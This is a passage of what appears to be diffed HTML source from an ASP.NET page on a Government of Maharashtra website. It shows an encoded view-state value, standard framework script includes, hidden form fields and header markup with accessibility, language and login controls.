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">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['frmMOLSite'];
+if (!theForm) {
+    theForm = document.frmMOLSite;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=rGUWwTkNV7YpMl0laM5y1kBWVhti05cE6TD7vxIvoXVFRU5BzC7O8T33HjFuAIqYyNqLVkzVDDfapGdIeSFh5wu_8Pr5eavImpFAMWqWiBE1&amp;t=639191031332169432" type="text/javascript"></script>
+
+
+<script src="js/Transliteration.js" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=9BZF2xOgeXR3rchLzXLQXiTLYG-t9ncRx7bZ5UOxjpSH72temh7JEkTni0K-7-_Eto24wUJyLrtdxYqnPg-i3PhvloJjsJiwWqSmYYpnwgiH98EO5yMVxcwrvd4sSAVaR3WlVNx0b4DtMhi-5CgvN-Eq4f9sY9ed-ZYT7yDkBR01&amp;t=ffffffffa5405632" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=zsyIXJ0jFhQFIFtV-G54_fhLkBsUgz62KmyGTU1NfdDjMA4mfDSf1vHf9esXvNsTCNZRlsR8cBjfs_OmytHlw8eODRiYjYPkYIgkpiqHC1D5WCelrCoamVK4BgDCcCNrF1kPwYtv5inprjdqyuGKLQ2&amp;t=27117261" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+<script src="/ScriptResource.axd?d=k0-iAxqSYor9091vvJ094LjzTo-13Tx8utjYPzR7aLZipIe-vCutdU8Txg6eu1jFM14rPNqwzmydfxv3Bj-2AGqqerT_5NlmYQN9yk6Oe0QP5UgO54Z5Dhnp1Y-UtIFs9OfLLufKa4KKGov0Zu-BRQ2&amp;t=27117261" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=lBJaLjt17kBrv76GheRglr95reckkaz1Xd5UN_401cu-sH7Y5ERYh2yjbPlzXPPuYtipq63PnvcLjvSlsxS6exgafoEh5SNYJqX2dW1ycqfHK1gANTRwrPUiHZ-3goVUTaRg1bruY4ORlHzZH-zm0w2&amp;t=27117261" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=kFpkuvY_4mDdXevkoReHSMzD5tcty8Xk16PF2WI-O6lnbqP4sTYc4pk2sldohRZaciJMQi9ynL4IcjUYLqKLAHnthfhwBZbZ2dUoPexDyrCFBorm5O7Xg5anUdiOCFBRE5UNZtupBd3ClPxhfiU3Uw2&amp;t=27117261" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=luhtBe7hesxnpgY4i8XlU4t9OeHXnVoYsKil6pRUXkYi_3VsJVL8dzjIOd18llpiQ2jeupGQSVFWf9HtK3Vd1l9fg4NvBtVGsfo4VuS-RAcxeb3wBsR5PDUSNjok8TbgmGP53_gxBe_1GOSTx04o381NnIkZIL8jCkpKYmdo2bw1&amp;t=27117261" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="A2300A8E">
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="CBsagm3J68tz352pp7SIRq5mCbUStFTfAl3T0V0WJxnoa9EL9Cxg4xvv5lXyxKIOq47E+gQS7AV0Vhj34c5eQEHh0pqvEo3n+e8xKKYGvJrtHl8MJdbOPgCNGA6Y9/FUF75NuJsl+JHUexSbdcpRykAH2qwax+bJ2GGW5tsmEeVFzS4eNG0//xlptmc3S5lA/agOb505xwY8Yvxh7f7zVoj9+gzyDtYpRpMS4TRA1eS4CH6ZLmj8ZXr7V4AIezcHTMBmetlk5aaCACuA0RJI6JsnYJE66bAGACnOyt4kcp5MM8/tTntFTIsTPlW0f8xdgrqaHP+/KlURHTQzlrJbx2knkeWbRzYdq3M+XmxUGJjRziMU0OH2JNqfEHrXkNC58ADCZhD35lcnj6iQnP7q4rzTgKfFQ+BzNDXnvmt/HPrDIRUok93eh9oK7vbeLMUjJhEFAy95vO5KajIJRqaZT8tchf76XhHIxk9mEtE7modaI1c7MWNrbRP1lWg/lohmoEhPEhINfLjHoVGofDqX4zMsUglK5dQVc/MVTS+dXDwk28iqXC5jS2iIR/DMlpj0cRkb0E4FWA5hxSTKpjZZq3dzB8pCTV9bYdFH5s9rDQbO+D77zzFWMhjoFbNIadLOC/CnENr2g4SF+dJn2LEE8mb8SH/dV27F6LECvVLrnA+pjV99p9SQ7gjsxe1opbA/hf8BEzEBUAXAmxFDNrBN1ePD1vI2v+UE8cbVN4ge+cZ22VL3R7HWOcXbWNdR3jNhMqp2sktz3AjFHi1qqaU4ujIdVfwWVh3HHyzkHbjOMSnYglZR5hOydFlL323Tp9K0EA+hpiFgh0RzupC3CaUbNRiDixOgX4pqZNBkSzpLox2oiwkazrPvqPg1X04i0lOSReiy1shKH7RGf7QmowIF26QwmmvDNAmrb38DWIFYbtgefOpOrCGeuufQ3liIISEprR11mLisXWzlYSWRm99FaoFKXZ5AkjD3ZTHmVlt3ygXvwfhsu/vzi2lsd+vpadMKcx+RYR3CF4/o9np1dDZRAHgTFt2O7nwQ4g0NQdjbqUEGq9h45aVCobseGQWaY+gLpjuC3kmANhrlWsgxhNUDTz1Ye1x6ajXsHlR0o+XCXDk0BaIWdA994+XwjO5TDAvxpv+hO+63QVGzGBTdipOg351FNJCoLHqT0Hy5wm/RYtH7Xc+rbT+cpRjCBYLbbKrwreKQRJGc0oV2Im/tAcbsYpfV9KV01kmLpelUdpKK7twsqm2SfAJcpdlAVSCpwy0HRdHhJ5zdwm4B6Dz5zxydhnN7Gub8HICmtPh38x1hKatkk1mUmh0l/zjNvRh4lutEgXC1GEW4RRrbxuKlxU/GfBaw8Ca0lnCW/3HCZbQsifxgsFj3CYe33HkXHSbpUnjgOjDlVkYD4agXEN2JRxm6Dpnl3+XnidR+lQHWu3eozY4Haw/7N9fOlgc8dXnvEW/ECG8aVln6PK3s0ML/CnFbRRY+r/tJH6nAY5ZHOI+Hxb18NDkNFG6ZkXIVTTGrW+qmgux5vcBgJEZD4ya+u53+TjPUR5tybQAxrtUThA0pV1W398WlgE0TeNukrG4JwKWyk6JSl8Yad9epZDUFbUDS4iHyp9cpFG86N0IeedlTyvXXnESG70V0qbLsdQpSSWa8K7PtwEuNOam947SqR0wRlw2r9fmmZ830hVCtN9MNJIV9tpIrJFxblVwstGwm1SC6gsfg0SmkpUpeWJFmgzq5GiVtFZsE+A0i++XNVfUTqC6Jwwab5c4via6b3xME0jeL6t9yazZN6RIdOVEFcLWFKBKEwtUKuN0kWwbpTJ0Mx7TCp2IoR0/PKBPkFz4G7GK28D918AQYMSwMccW4JXPUC2YjMA8iI95Bqw+bAruIBhtBRWp6WBxEZHQg2F7eiVndJzsqMadCy2hqQoJUz59SjeHAcyOXN7fV1a/h7MRcYp3dcEqNAMTvzydzvZ1T44nh">
+</div>
+    <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ctl00$SM1', 'frmMOLSite', [], [], [], 90, 'ctl00');
+//]]>
+</script>
+
+    <div id="divnew" class="medium">
+        <div id="main">
+            <div id="container">
+                <div id="header">
+                    
+<div class="headerTop">
+    <div class="headPane">
+        <div class="paneLeft">
+        </div>
+        <div class="paneMid">
+            <div style="display: none">
+                <span id="HeaderMain1_lbl_Welcome">Welcome</span>
+            </div>
+            <div class="topLinks">
+                <ul class="other_links">
+                    
+                    
+                    <li><a href="#Navigation">
+                        <span id="HeaderMain1_lbl_skipToNav">Skip to Navigation</span></a></li>
+                    <li><a href="#Content">
+                        <span id="HeaderMain1_lbl_skipToContent">Skip to Main Content</span></a></li>
+                    
+
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btn_Smallest1" id="HeaderMain1_SetCulture1_btn_Smallest1" class="btnResizer" src="../Images/smallestFont.jpg" alt="Set to Smallest Font">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btn_Small1" id="HeaderMain1_SetCulture1_btn_Small1" class="btnResizer" src="../Images/smallerFont.jpg" alt="Set to Smaller Font">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btn_Medium1" id="HeaderMain1_SetCulture1_btn_Medium1" class="btnResizer" src="../Images/mediumFont.jpg" alt="Set to Medium Font">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btn_Large1" id="HeaderMain1_SetCulture1_btn_Large1" class="btnResizer" src="../Images/largerFont.jpg" alt="Set to Larger Font">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btn_Larger1" id="HeaderMain1_SetCulture1_btn_Larger1" class="btnResizer" src="../Images/largestFont.jpg" alt="Set to Largest Font">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btnABlack1" id="HeaderMain1_SetCulture1_btnABlack1" src="../Images/black.jpg" alt="High Contrast">
+</li>
+<li class="m_hide">
+    
+    <input type="image" name="ctl00$HeaderMain1$SetCulture1$btnAWhite1" id="HeaderMain1_SetCulture1_btnAWhite1" src="../Images/white.jpg" alt="Low Contrast">
+</li>
+<li>
+    <input type="submit" name="ctl00$HeaderMain1$SetCulture1$btn_Language" value="मराठी" id="HeaderMain1_SetCulture1_btn_Language" class="btnResizer ">
+</li>
+
+                    
+                            <li>
+                                <input type="submit" name="ctl00$HeaderMain1$HeadLoginView$btnlogin" value="Login" id="HeaderMain1_HeadLoginView_btnlogin" class="btnResizer"></li>
+                        
+                </ul>
+            </div>
+        </div>
+        <div class="paneRight">
+        </div>
+    </div>
+</div>
+<div class="headMid">
+    <div class="depName">
+        <a href="../../Site/Home/Index.aspx">
+            <img id="HeaderMain1_ImgGovtLogo" src="../Images/Logo.png" alt="Government of Maharashtra Logo" style="height:78px;width:76px;">
+        </a><span>
+            <img id="HeaderMain1_ImgDepName" src="../Images/depName.png" alt="Government of Maharashtra, India"></span>
+    </div>
+    <div class="depNameR">
+        <a href="https://india.gov.in/" target="_blank"><span>
+            <img id="HeaderMain1_ImgEmblem" src="../Images/cenLogo.png" alt="Government of India Logo" style="height:84px;"></span>
+            </a></div>
+</div>
+<div class="nav">
+    <div class="navLeft">
+    </div>
+    <div class="navMid">
+        <div class="menuBG">
+            
+<a href="#" name="Navigation"></a>
